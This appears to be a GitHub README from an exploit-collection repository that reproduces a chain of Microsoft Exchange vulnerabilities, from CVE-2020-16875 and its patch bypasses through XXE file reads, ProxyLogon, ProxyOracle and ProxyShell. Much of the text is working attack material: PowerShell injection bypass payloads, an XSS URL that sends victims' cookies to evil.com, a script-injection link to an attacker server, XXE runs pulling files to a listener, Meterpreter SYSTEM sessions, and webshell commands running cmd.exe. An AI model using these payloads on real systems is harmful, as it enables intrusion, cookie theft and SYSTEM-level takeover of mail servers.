 - [metasploit exchange_ecp_dlp_policy.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/exchange_ecp_dlp_policy.rb)
 - [Making Clouds Rain :: Remote Code Execution in Microsoft Office 365](https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html)

- Affected exchange versions: Exchange Server <= 2016 CU19 and 2019 CU8 (December 2020 updates)
 - Original disclosure date: 2020-09-08
 - Release date of the latest patch bypass: 2021-01-12

This vulnerability allows a remote attacker to execute arbitrary code on an affected Exchange Server. Authentication is required to exploit it. In addition, the target user must have the "Data Loss Prevention" role assigned and an active mailbox. A user in the "Compliance Management" role group, or the more privileged "Organization Management" role group, has the "Data Loss Prevention" role. Because the user who installs Exchange is in the "Organization Management" role group, they transitively have the "Data Loss Prevention" role. The specific flaw exists in the handling of the New-DlpPolicy command. The issue results from the lack of proper validation of user-supplied template data when creating a DLP policy. An attacker can leverage this vulnerability to execute code with SYSTEM privileges.

- Local test exchange environment

| Test status | exchange version | File Name | Publication date | File Size |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| Test succeeded | Exchange Server 2016 Cumulative Update CU17(KB4556414) 15.01.2044.004 | ExchangeServer2016-x64-cu17.iso | 2020/6/12 | 6.6 GB |

The exchange user being attacked needs the "Data Loss Prevention" role assigned, and if the attack is carried out through the ecp interface (this poc) the user will need a usable mailbox.

``` bash
New-RoleGroup -Name "dlp users" -Roles "Data Loss Prevention" -Members "harrym"
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/cve-2020-16875.png)

``` bash
Get-RoleGroup "dlp users" | Format-List
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/cve-2020-16875-1.png)

1. python poc

- [cve-2020-16875.py](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/CVE-2020-16875/cve-2020-16875.py)

The exact attack request flow is written out very clearly in the poc, so it is not analysed further here; the command is executed successfully with system privileges

``` bash
(base) D:\1.recent-research\exchange\proxy-attackchain\CVE-2020-16875>python cve-2020-16875.py 192.168.14.6 administrator@exchange2016.com:xxxxxx mspaint
(+) logged in as administrator@exchange2016.com
(+) found the __viewstate: /wEPDwUILTg5MDAzMDFkZPMgRmGb/6MPD4JaqGioF1vSUbmaOqIkWGNUIP6TVhRU
(+) executed mspaint as SYSTEM!
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/cve-2020-16875-2.png)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/cve-2020-16875-3.png)

2. powershell poc

- [cve-2020-16875.ps1](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/CVE-2020-16875/cve-2020-16875.ps1)

This script uses Kerberos authentication to request the PowerShell endpoint, so it has to be used inside the domain

3. metasploit exchange_ecp_dlp_policy module

``` bash
msf6 exploit(windows/http/exchange_ecp_dlp_policy) > run

[*] Started HTTPS reverse handler on https://192.168.123.1:8443
[*] Executing automatic check (disable AutoCheck to override)
[!] The service is running, but could not be validated. OWA is running at https://192.168.123.192/owa/
[*] Logging in to OWA with creds Administrator:Passw0rd!
[+] Successfully logged in to OWA
[*] Retrieving ViewState from DLP policy creation page
[+] Successfully retrieved ViewState
[*] Creating custom DLP policy from malicious template
[*] DLP policy name: Abbotstone Agricultural Property Unit Trust Data
[*] Powershell command length: 2372
[*] https://192.168.123.1:8443 handling request from 192.168.123.192; (UUID: rwlz4ahe) Staging x64 payload (201308 bytes) ...
[*] Meterpreter session 1 opened (192.168.123.1:8443 -> 192.168.123.192:6951) at 2020-09-16 02:39:17 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-365Q2VJJS17
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : GIBSON
Logged On Users : 8
Meterpreter     : x64/windows
meterpreter >
```

# CVE-2020-17132 (completed)
## CVE-2020-17132 part links

- [Making Clouds Rain :: Remote Code Execution in Microsoft Office 365](https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html)
 - [CVE-2020-16875 Protection/Filter Bypass](https://raw.githubusercontent.com/x41sec/advisories/master/X41-2020-007/x41mas-2020-007-microsoft-exchange-rce.txt)
 - [Microsoft Exchange Remote Code Execution - CVE-2020-16875](https://www.x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/)

- origin payload:

``` bash
$i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName="cmd";$i.Arguments="/c %s";$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start()
```

The bypass payloads below can be dropped straight into the [cve-2020-16875](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/CVE-2020-16875/cve-2020-16875.py) poc script in place of the original poc code. The principle of the patch bypass and the analysis of the technique are written out very clearly in the article links above

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/CVE-2020-17132.png)

- bypass1:

``` bash
neW-tRaNsPoRtRuLe $([Diagnostics.Process]::Start("cmd", "/c %s")) #-dLpPoLiCy

neW-tRaNsPoRtRuLe fdvoid0; [Diagnostics.Process]::Start("cmd", "/c %s") #-dLpPoLiCy
```

- bypass2:

``` bash
neW-tRaNsPoRtRuLe fdvoid0; $poc='New-object'; $i = & $poc System.Diagnostics.ProcessStartInfo; $i.UseShellExecute = $true; $i.FileName="cmd"; $i.Arguments="/c %s"; $r = & $poc System.Diagnostics.Process; $r.StartInfo = $i; $r.Start() #-dLpPoLiCy
```

- bypass3:

``` bash
neW-tRaNsPoRtRuLe $([Diagnostics.Process]::Start("cmd", "/c %s")) -DlpPolicy "%%DlpPolicyName%%"
```

- bypass4:

``` bash
& 'Invoke-Expression' '[Diagnostics.Process]::Start("cmd","/c %s")'; New-TransportRule -DlpPolicy
```

# CVE-2020-17083 (completed)
## CVE-2020-17083 part links

- [Microsoft Exchange Server ExportExchangeCertificate WriteCertiricate File Write Remote Code Execution Vulnerability](https://srcincite.io/pocs/cve-2020-17083.ps1.txt)
 - [CVE-2020-17083: analysis of the Exchange Authed Rce](https://mp.weixin.qq.com/s/sC9rN4NhO9a6Q-uQWNXa7Q)

- Affected exchange versions

``` bash
Microsoft Exchange Server 2013 Cumulative Update 23
Microsoft Exchange Server 2016 Cumulative Update 17
Microsoft Exchange Server 2016 Cumulative Update 18
Microsoft Exchange Server 2019 Cumulative Update 6
Microsoft Exchange Server 2019 Cumulative Update 7
```

| Test status | exchange version | File Name | Publication date | File Size |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| Test succeeded | Exchange Server 2016 Cumulative Update CU17(KB4556414) 15.01.2044.004 | ExchangeServer2016-x64-cu17.iso | 2020/6/12 | 6.6 GB |
| Test succeeded | Exchange Server 2013 Cumulative Update 23 (KB4489622) 15.00.1497.002 | Exchange2013-x64-cu23.exe | 2021/5/3 | 1.6 GB |

This vulnerability is caused by the ExportExchangeCertificate WriteCertiricate file write feature. A remote attacker can leverage it to execute arbitrary code in the context of the application through a carefully crafted HTTP request.

- (ab) The user needs the "Exchange Server Certificates" role assigned

``` bash
[PS] C:\Windows\system32>New-RoleGroup -Name "cert users" -Roles "Exchange Server Certificates" -Members "administrator"

Name       AssignedRoles                  RoleAssignments                           ManagedBy
----       -------------                  ---------------                           ---------
cert users {Exchange Server Certificates} {Exchange Server Certificates-cert users} {exchange2016.com/Microsoft Exchange Secur
                                                                                    ity Groups/Organization Management, exchan
                                                                                    ge2016.com/Users/Administrator}

[PS] C:\Windows\system32>Get-RoleGroup "cert users" | Format-List


RunspaceId                  : ded4f6c8-e011-42e3-b68e-5b9a3beb1e5d
ManagedBy                   : {exchange2016.com/Microsoft Exchange Security Groups/Organization Management, exchange2016.com/U
                              sers/Administrator}
RoleAssignments             : {Exchange Server Certificates-cert users}
Roles                       : {Exchange Server Certificates}
DisplayName                 :
ExternalDirectoryObjectId   :
Members                     : {exchange2016.com/Users/Administrator}
SamAccountName              : cert users
Description                 :
RoleGroupType               : Standard
LinkedGroup                 :
Capabilities                : {}
LinkedPartnerGroupId        :
LinkedPartnerOrganizationId :
Identity                    : exchange2016.com/Microsoft Exchange Security Groups/cert users
IsValid                     : True
ExchangeVersion             : 0.10 (14.0.100.0)
Name                        : cert users
DistinguishedName           : CN=cert users,OU=Microsoft Exchange Security Groups,DC=exchange2016,DC=com
Guid                        : b912e05a-5bfe-4846-90fb-9fbdf15ec412
ObjectCategory              : exchange2016.com/Configuration/Schema/Group
ObjectClass                 : {top, group}
WhenChanged                 : 2023/11/16 10:14:11
WhenCreated                 : 2023/11/16 10:14:11
WhenChangedUTC              : 2023/11/16 2:14:11
WhenCreatedUTC              : 2023/11/16 2:14:11
OrganizationId              :
Id                          : exchange2016.com/Microsoft Exchange Security Groups/cert users
OriginatingServer           : WIN-UPF09R7H264.exchange2016.com
ObjectState                 : Changed
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/cve-2020-17083.png)

- Reproducing the vulnerability

The original powershell poc has to be used inside a domain environment, and is reproduced directly on the vulnerable exchange machine itself. To get remote RCE in a non-domain environment it would have to be rewritten as a python exp and the endpoint python uses to run powershell commands would have to be changed; no suitable way of doing this has been found so far

- [cve-2020-17083.ps1](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/CVE-2020-17083/cve-2020-17083.ps1)

``` bash
PS C:\Users\Administrator\Desktop> .\cve-2020-17083.ps1 -server WIN-UPF09R7H264.exchange2016.com
-usr administrator@exchange2016.com -pwd 123456Wx.. -cmd mspaint
(+) targeting WIN-UPF09R7H264.exchange2016.com with administrator@exchange2016.com:123456Wx..
(+) wrote to target file C:/Windows/Temp/BIAHDTaO.hta
(+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/Mo3LwKhN
.aspx
(+) shell written, executing command...
(+) executed mspaint as SYSTEM!
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/cve-2020-17083-1.png)

``` bash
PS C:\Users\Administrator\Desktop> .\cve-2020-17083.ps1 -server WIN-2FFDIR22V0Q.exchange2013.com -usr administrator@exchange2013.com -pwd 123456Wx.. -cmd mspaint
(+) targeting WIN-2FFDIR22V0Q.exchange2013.com with administrator@exchange2013.com:123456Wx..
(+) wrote to target file C:/Windows/Temp/HZkLQyCX.hta
(+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/X98xek1r.aspx
(+) shell written, executing command...
(+) executed mspaint as SYSTEM!
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/cve-2020-17083-2.png)

# CVE-2020-17141 & CVE-2020-17143 XXE file read exploitation chain (completed)
## CVE-2020-17141 & CVE-2020-17143 part links

- [Microsoft Exchange Server OWA OneDriveProUtilities GetWacUrl XML External Entity Processing Information Disclosure Vulnerability](https://srcincite.io/pocs/cve-2020-17143.py.txt)
 - [Microsoft Exchange Server EWS RouteComplaint ParseComplaintData XML External Entity Processing Information Disclosure Vulnerability](https://srcincite.io/pocs/cve-2020-17141.py.txt)

- Information about the affected exchange system versions

``` bash
Microsoft Exchange Server 2019 Cumulative Update 7
Microsoft Exchange Server 2019 Cumulative Update 6
Microsoft Exchange Server 2016 Cumulative Update 18
Microsoft Exchange Server 2016 Cumulative Update 17
Microsoft Exchange Server 2013 Cumulative Update 23
```

| Test status | exchange version | File Name | Publication date | File Size |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| Test succeeded | Exchange Server 2016 Cumulative Update CU17(KB4556414) 15.01.2044.004 | ExchangeServer2016-x64-cu17.iso | 2020/6/12 | 6.6 GB |
| Test failed | Exchange Server 2013 Cumulative Update 23 (KB4489622) 15.00.1497.002 | Exchange2013-x64-cu23.exe | 2021/5/3 | 1.6 GB |

These are two XXE exploitation chains. Exploiting them requires a low-privilege account, and successful exploitation can read files that require administrator privileges

- [cve-2020-17141](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/CVE-2020-17141%20%26%20CVE-2020-17143/cve-2020-17141.py)

This vulnerability allows a remote attacker to disclose information on an affected Exchange Server. Authentication is required to exploit it. The specific flaw exists in the handling of the RouteComplaint SOAP request to the EWS service endpoint. The issue results from the lack of proper validation of user-supplied xml. An attacker can leverage this vulnerability to disclose information in the context of SYSTEM.

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/cve-2020-17141.png)

``` bash
(base) E:\1.recent-research\exchange\proxy-attackchain\CVE-2020-17141 & CVE-2020-17143>python cve-2020-17141.py 192.168.14.6 administrator@exchange2016.com:123456Wx.. 192.168.0.11:9090 "C:/Users/Administrator/Desktop/CVE-2020-17141.txt"
(+) triggered xxe in exchange!
(+) stolen: /leaked?<![CDATA[CVE-2020-17141 test text....
fdvoid0 is here...]]>

(base) E:\1.recent-research\exchange\proxy-attackchain\CVE-2020-17141 & CVE-2020-17143>python cve-2020-17141.py 192.168.14.6 administrator@exchange2016.com:123456Wx.. 192.168.0.11:9090 "C:/Windows/win.ini"
(+) triggered xxe in exchange!
(+) stolen: /leaked?<![CDATA[; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
]]>
```

- [cve-2020-17143](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/CVE-2020-17141%20%26%20CVE-2020-17143/cve-2020-17143.py)

This vulnerability allows a remote attacker to disclose information on an affected Exchange Server. Authentication is required to exploit it. The specific flaw exists in the handling of the GetWacIframeUrlForOneDrive service command. The issue results from the lack of validation of user-supplied xml. An attacker can leverage this vulnerability to disclose information in the context of SYSTEM.

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/cve-2020-17143.png)

``` bash
(base) E:\1.recent-research\exchange\proxy-attackchain\CVE-2020-17141 & CVE-2020-17143>python cve-2020-17143.py 192.168.14.6 administrator@exchange2016.com:123456Wx.. 192.168.0.11:9090 "C:/Users/Administrator/Desktop/CVE-2020-17141.txt"
(+) triggered xxe in exchange server!
(+) stolen: /leaked?%3C!%5BCDATA%5BCVE-2020-17141%20test%20text....%0D%0Afdvoid0%20is%20here...%5D%5D%3E

(base) E:\1.recent-research\exchange\proxy-attackchain\CVE-2020-17141 & CVE-2020-17143>python cve-2020-17143.py 192.168.14.6 administrator@exchange2016.com:123456Wx.. 192.168.0.11:9090 "C:/Windows/win.ini"                         (+) triggered xxe in exchange server!
(+) stolen: /leaked?%3C!%5BCDATA%5B;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions%5D%0D%0A%5Bmci%20extensions%5D%0D%0A%5Bfiles%5D%0D%0A%5BMail%5D%0D%0AMAPI=1%0D%0A%5D%5D%3E
```

# CVE-2020-17144 (completed)
## CVE-2020-17144 part links

- [Analysis and weaponization of the CVE-2020-17144 vulnerability](https://www.zcgonvh.com/post/analysis_of_CVE-2020-17144_and_to_weaponizing.html)
 - [CVE-2020-17144 zcgonvh github exp](https://github.com/zcgonvh/CVE-2020-17144)
 - [Exchange2010 authorized RCE](https://github.com/Airboi/CVE-2020-17144-EXP)
 - [CVE-2020-17144 : Microsoft Exchange Server EWS Insecure Deserialization](https://www.keysight.com/blogs/tech/nwvs/2022/03/10/cve-2020-17144-microsoft-exchange-server-ews-insecure-deserialization)
 - [[Very detailed] Reproducing the Microsoft Exchange remote code execution vulnerability [CVE-2020-17144]](https://mp.weixin.qq.com/s?__biz=MzU5NjA0ODAyNg==&mid=2247484324&idx=1&sn=f3c8e8b37386e4ca8e7d65ed059ba0c4&chksm=fe69e251c91e6b476a26d5296152153b5d279d61cc78a6abf91001fd1d15d50f18c3944c884a&scene=126&sessionid=1608521158&key=032c59c0a43519d159f58e3ddbdf9a4f22f4b5f6de472ffb622cc9bbb5922e25bf20bf89928225fb7094f5ec307fcf3db24d356336d7081b3146a18a8508ac16589d79c3e6ef43d31ce8d1d05e5a6cb97aa87121903c9115f3b5ecfe85a23089a7c2fd9def86e59614a2b466d1187d87cd65edbe87e40fa2f3587c3d1f2b47b4&ascene=1&uin=MjExMzQ5OTU0NA%3D%3D&devicetype=Windows+10+x64&version=6300002f&lang=zh_CN&exportkey=A%2FMi0SWv7TyhMLihi1rfRe8%3D&pass_ticket=nGG1z%2BnLMzm8%2F%2FVIQpbkOytO59crshu1nx6DmKyMbxjesQ8ypSPy6YiXuyKi9boi&wx_header=0)

- Information about the affected exchange system versions

``` bash
Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 31
```

- There are many mature weaponized exp tools and analysis articles online, so it is not reproduced again here

# CVE-2021-24085 ()
## CVE-2021-24085 part links

- [Hunting Down MS Exchange Attacks. Part 2 (CVE-2020–0688, CVE-2020–16875, CVE-2021–24085)](https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-2-cve-2020-0688-cve-2020-16875-cve-2021-24085-8355ec0917c)
 - [Microsoft Exchange Server msExchEcpCanary Cross Site Request Forgery Elevation of Privilege Vulnerability](https://github.com/sourceincite/CVE-2021-24085)

- Information about the affected exchange system versions

``` bash
microsoft:exchange_server:2016:cumulative_update_18
microsoft:exchange_server:2016:cumulative_update_19
microsoft:exchange_server:2019:cumulative_update_7
microsoft:exchange_server:2019:cumulative_update_8
```

# CVE-2021-28482 ()
## CVE-2021-28482 part links

# ProxyLogon (completed)
## ProxyLogon part links

- [Proxylogon](https://proxylogon.com/)
 - [A New Attack Surface on MS Exchange Part 1 - ProxyLogon!](https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html)
 - [Analysis of the ProxyLogon vulnerability](https://hosch3n.github.io/2021/08/22/ProxyLogon%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
 - [Reproducing the Microsoft Exchange Proxylogon exploitation chain](https://xz.aliyun.com/t/9305)

- Information about the exchange versions affected by the vulnerability

``` bash
Exchange Server 2019 < 15.02.0792.010
Exchange Server 2019 < 15.02.0721.013
Exchange Server 2016 < 15.01.2106.013
Exchange Server 2013 < 15.00.1497.012
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxylogon.png)
 - ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxylogon1.png)
 - ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxylogon2.png)

# ProxyOracle (completed)
## ProxyOracle part links

- [A New Attack Surface on MS Exchange Part 2 - ProxyOracle!](https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html)
 - [Analysis of the ProxyOracle vulnerability](https://hosch3n.github.io/2021/08/23/ProxyOracle%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

- Affected versions

CVE-2021-31195
``` bash
Exchange Server 2013 < May21SU
Exchange Server 2016 < May21SU < CU21
Exchange Server 2019 < May21SU < CU10
```

CVE-2021-31196
``` bash
Exchange Server 2013 < Jul21SU
Exchange Server 2016 < Jul21SU
Exchange Server 2019 < Jul21SU
```

Once a victim clicks this link, evil.com will receive the cookies.

``` bash
https://ews.lab/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};document.cookie=`X-AnonResource-Backend=@evil.com:443/path/any.php%23~1941962753`;document.cookie=`X-AnonResource=true`;fetch(`/owa/auth/any.skin`,{credentials:`include`});//
```

or use 3gstudent's way:

## step1: setting up the XSS platform

With the help of the SSRF vulnerability, make the Exchange server send the Cookie information to the XSS platform, so that the Cookie information you finally want ends up in the Request Headers

But most existing XSS platforms pass data through the parameters of a POST request

To solve this problem, an open source XSS platform can be chosen here, at the address below:

https://github.com/3gstudent/pyXSSPlatform

Only the following places need to be changed:

- Change index.js, using ajax to simulate the user sending the packet that triggers the SSRF vulnerability

- Change pyXSSPlatform.py to extract the Request Headers of the GET request

- Use a valid certificate

index.js code example:

``` bash
var xmlHttp = new XMLHttpRequest();
xmlhttp.open("GET", "https://192.168.1.1/owa/auth/x.js", false);
document.cookie = "X-AnonResource=true";
document.cookie = "X-AnonResource-Backend=OurXssServer.com/#~1";
xmlhttp.send();
```

## step2: XSS exploitation code

Code example that makes the user visit the XSS platform:

``` bash
https://192.168.1.1/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};document.head.appendChild(document.createElement(/script/.source)).src=/https:\/\/OurXssServer.com\/index.js/.source//
```

## step3: example cookie for decryption test:

``` bash
cadata=FVtSAAWdOn29HYDQry+kG+994VUdAxONrayi4nbJW9JWTh8yLueD6IxYpahfxcGsA/B3FoVUQOD2EG605SR4QdeQ1pof+KD//6jwpmYQjv/II+OcqChrFZFvcMWv46a5; cadataTTL=eTxCEHKHDMmd/gEqDuOafg==; cadataKey=T4juhN4dUMKY4wkajUD43n4EWfMwefPQlqzxXmK4GnSHIZqo+g+uQg1Y2ogGoD1HyoVpRYgjGcCu6rmNQK+LsaZ8/lfBCThBI5yAhP1W2Fx+YNKvzy8Bcpui7zTlhAY598lE5Aijs6crHVXJeZkbLfMJgp0cFHj5uTQPcg31O/AeOAnD5c27IYOQ7JqMW7GOUVor1lhYnhh0R/NtWWqyfr5oE9j0jbxIGgrQrXIpLxL/uAU1ddC+/5jG9Edpq4sC213amuU/94rkHYzNH9OsiHYIkXr/NmkB7p908XrFrwXAcvV9QieoRiS3jvKCbzk3mnMu3YTnsJwAuiHzSXdCOQ==; cadataIV=GB9B+rwrigyPOf8xnV1KAek++yovEot9jFcV68WepCTQoRtQ5HUxSC7tE1mmHg0YtE6EOZNUM/WiNGP6xI4UTAofcMOfTLeRpBzeaKOETfjxKK2W7IKn+9k2tRkc1pIlO8FTOVx/dOHOoIFHUkqxFr+TgBULJ1I7tUmO7W0XDX4ZJHfmQhVqOOzeyjImKdX7Uv/jIJrF4VEew7rgvrC8BhqOqWgaTxpGhDTzIXl+wW3crsgZmXpXhOPURej1iwmtvhuQU6iuq4/IRv0lVIW3WvP6gUI8owIUxppnJl7YmN27Aqkjs0nTZZz1LBuZN+YxY4x6Lvs2FMG68jllhE4kwg==; cadataSig=BOJSYN2B+3RsXjO2akh3mqlKKkeAZVamOzfpVo0QdPEA3BHjpR6ls5yD9TzAQzRuWJJaaRIm7wMEiBMFz/sK5jk3R6kWw1OmMtJN2c38PdvwGIe6/7ByJdl52a5ojhDrRZhc4Qc3y+FFRx6XKvqUljTRWtHJGI1Jad2+LiNhJGkalhUeTM/a2V4LiQWf6Vv1KzJO79rZuOOOBnatht/E29j6636FpllCfEKrrogPQ7ADdVS6OOmqNU9gRMVgKnomC2t2PCtuYj26HUjnZ3rfc6BdzVmtu9EYSzccObsB2jxXXclAm5a+NZU/6sj9tlq3gcurjBl9yUDTgbZLg383gw==
```

- amd64 poc binary usage:
 - just a modyfied version of [padre](https://github.com/glebarez/padre), added proxyoracle detect poc code...
 - ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyoracle.png)

- python script exp usage:

Decrypt this cookie to plaintext:

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyoracle1.png)

# ProxyShell (completed)
## ProxyShell part links

- [My Steps of Reproducing ProxyShell](https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/)
 - [Analysis of the ProxyShell vulnerability](https://hosch3n.github.io/2021/08/24/ProxyShell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
 - [FROM PWN2OWN 2021: A NEW ATTACK SURFACE ON MICROSOFT EXCHANGE - PROXYSHELL!](https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell)
 - [Reproducing The ProxyShell Pwn2Own Exploit](https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1)
 - [ProxyShell](https://github.com/ktecv2000/ProxyShell)
 - [A basic proxyshell scanner](https://github.com/dinosn/proxyshell)
 - [Generate proxyshell payload by Py Permutative Encoding](https://github.com/Ridter/proxyshell_payload)
 - [CVE-2021-34473-Exchange-ProxyShell](https://github.com/je6k/CVE-2021-34473-Exchange-ProxyShell)
 - [Reproducing the Exchange ProxyShell remote code execution vulnerability](https://www.buaq.net/go-83692.html)
 - [Reproduction and analysis of the exchange-proxyshell vulnerability](https://blog.riskivy.com/exchange-proxyshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/)
 - [Proof of Concept Exploit for Microsoft Exchange CVE-2021-34473, CVE-2021-34523, CVE-2021-31207](https://github.com/horizon3ai/proxyshell)

## short intro

- Information about the affected exchange versions

CVE-2021-34473 & CVE-2021-34523
``` bash
Exchange Server 2013 < Apr21SU
Exchange Server 2016 < Apr21SU < CU21
Exchange Server 2019 < Apr21SU < CU10
```

CVE-2021-31207
``` bash
Exchange Server 2013 < May21SU
Exchange Server 2016 < May21SU < CU21
Exchange Server 2019 < May21SU < CU10
```

- CVE-2021-34473 - Pre-auth Path Confusion

This faulty URL normalization lets us access an arbitrary backend URL while running as the Exchange Server machine account. Although this bug is not as powerful as the SSRF in ProxyLogon, and we could manipulate only the path part of the URL, it’s still powerful enough for us to conduct further attacks with arbitrary backend access.

``` bash
https://xxx.xxx.xxx.xxx/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@foo.com
```

- CVE-2021-34523 - Exchange PowerShell Backend Elevation-of-Privilege
 - CVE-2021-31207 - Post-auth Arbitrary-File-Write

## let's getting started and split proxyshell part to part ......

generate proxyshell specified webshell payload.

- [proxyshell_payload_gen.py](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxyshell/proxyshell_payload_gen.py)

just put the webshell content you want to "webshell", then it will be fine...

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyshell.png)

then put the encoded webshell to <t:Content>...</t:Content> in chkproxyshell.go

confirm proxyshell and get the sid value to generate token.

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyshell1.png)

use the following py script to gen token value

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyshell2.png)

confirm the token is valid

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyshell3.png)

now use the token to send a email with shell attachment in, this may be saved as a draft in test user's mailbox...

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyshell4.png)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyshell5.png)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyshell6.png)

finnaly use the following wsman python script to export The draft to webshell, sometimes may write shell failed, try one more time will be fine :)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyshell7.png)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyshell8.png)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyshell9.png)

access the shell and then execute the commands you want:

``` bash
view-source:https://192.168.186.130//aspnet_client/redhedh.aspx?cmd=Response.Write(Response.Write('eeeeeeeeeeeeeeeeeeee lUc1f3r11 is here!!!!'));
```

shell is just work fine!!!

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyshell10.png)

command exec:

``` bash
view-source:https://192.168.186.130//aspnet_client/redhedh.aspx?cmd=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami /all").StdOut.ReadAll());
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyshell11.png)
